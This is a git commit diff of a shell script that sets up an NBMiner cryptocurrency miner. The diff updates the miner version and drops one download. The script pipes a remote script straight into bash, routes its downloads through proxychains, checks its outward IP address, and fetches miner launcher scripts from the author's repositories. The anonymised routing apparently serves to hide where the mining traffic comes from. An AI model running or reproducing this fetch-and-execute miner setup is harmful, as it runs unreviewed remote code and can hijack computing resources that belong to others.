d7634be8372430b1d81e192e017a8e160ebdb288
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-02-02 21:46:58 +0200

    Update start_nbHive.sh

--- start_nbHive.sh
+++ start_nbHive.sh
@@ -1,15 +1,8 @@
 wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
 proxychains curl ifconfig.me
-proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.0/NBMiner_36.0_Linux.tgz
-tar -xvzf NBMiner_36.0_Linux.tgz
+proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
+tar -xvzf NBMiner_36.1_Linux.tgz
 cd NBMiner_Linux
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/PowETH.zip
-unzip PowETH.zip
-chmod +x start_2miners.sh
-chmod +x start_flypool.sh
-chmod +x start_hiveon.sh
-chmod +x start_ravenminerpplns.sh
-chmod +x start_ravenminerpps.sh
 proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbHiveon.sh
 chmod +x nbHiveon.sh
 proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
